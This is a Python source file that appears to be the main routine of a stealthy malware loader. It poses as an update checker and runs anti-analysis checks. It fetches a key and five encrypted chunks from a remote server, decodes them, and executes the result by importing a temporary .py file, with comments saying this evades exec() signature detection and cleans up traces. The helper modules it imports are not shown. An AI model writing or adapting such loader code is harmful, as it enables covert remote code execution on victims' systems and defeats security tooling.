import time
import ctypes
import sys
from .downloader import Downloader
from .decoder import Decoder

def main():
    from .config import Config
    
    # 0. Anti-Analysis Check
    if not Config.check_safety():
        return

    downloader = Downloader()
    
    print("[*] Checking for updates...")
    # 1. Authenticate / Get Key
    xor_key = downloader.get_decryption_key()
    if not xor_key:
        print("[-] System up to date. (No key found)") # Stealthy exit
        return

    # print(f"[+] Key received: {xor_key}") # OMITTED FOR STEALTH

    # 2. Download Chunks
    chunks = []
    # print("[*] Downloading package...")
    
    # We attempt to download chunks 0-4
    for i in range(5):
        # Stealth: no prints
        chunk_data = downloader.fetch_chunk(str(i))
        if chunk_data:
            chunks.append(chunk_data)
        else:
            return

    # 3. Assemble
    full_encrypted = "".join(chunks) 
    
    # 4. Decode
    try:
        payload_bytes = Decoder.decode_pipeline(full_encrypted, xor_key)
    except Exception:
        return
    
    if payload_bytes:
        try:
            # STEALTH EXECUTION: Write to temp .py file -> Import -> Cleanup
            # This avoids direct 'exec()' pattern signatures
            import tempfile
            import importlib.util
            import os
            
            # Create a temp file with .py suffix
            # delete=False needed because we need to close it before importing on Windows sometimes
            fd, path = tempfile.mkstemp(suffix=".py", text=True)
            
            try:
                with os.fdopen(fd, 'w', encoding='utf-8') as tmp:
                    tmp.write(payload_bytes.decode('utf-8'))
                
                # Import the module dynamically
                spec = importlib.util.spec_from_file_location("pkg_update", path)
                if spec and spec.loader:
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)
                    
                    # If the payload has a main(), run it
                    if hasattr(module, 'main'):
                        module.main()
                        
            finally:
                # Cleanup immediate traces
                if os.path.exists(path):
                    os.remove(path)
                    
        except Exception:
            pass
    else:
        print("[-] Decryption returned empty payload.")

if __name__ == "__main__":
    main()
